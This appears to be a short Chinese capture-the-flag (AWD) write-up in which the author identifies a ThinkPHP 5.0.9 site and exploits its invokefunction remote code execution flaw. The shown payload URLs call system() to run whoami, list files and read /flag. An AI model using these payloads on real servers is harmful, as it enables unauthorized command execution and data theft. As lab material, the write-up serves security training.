## AWD-Test1

直接爆了CMS版本号  

![](../Images/72e9d716ee0be079a347d13ca51d8215.png)

  

我们重新刷新一下之后就进入了主页  

![](../Images/f69c2417d33554cdce4d94e251d5fc1a.png)

  

搜索一下thinkphp 5.0.9 漏洞  

![](../Images/b402f9eb4ee4e8ad95e9c177dc793160.png)

  

利用 system 函数远程命令执行验证漏洞是否存在

  

```
http://<domain>:<port>/index/Index/index.html?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=<whoami>
```

证明漏洞是存在的，没有被修复

  

通过ls我们来遍历一下文件，寻找一下flag  

![](../Images/d25ce5fdd964b799fa990b544e29ccdd.png)

  

然后我们使用hackbar对网站开始操作  
先试试把index.php打开看看  

![](../Images/6a4e81da7b71712e63334dc4ed6db653.png)

  

但我遍历根目录的时候发现了一些好玩的东西  

![](../Images/22627d7877adfc8566d1395ba1d03047.png)

  

```
http://<domain>:<port>/index/Index/index.html?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag
```

最后我们得到这个flag{a12fdb09-19bd-49a9-8bc2-83f84663364c}
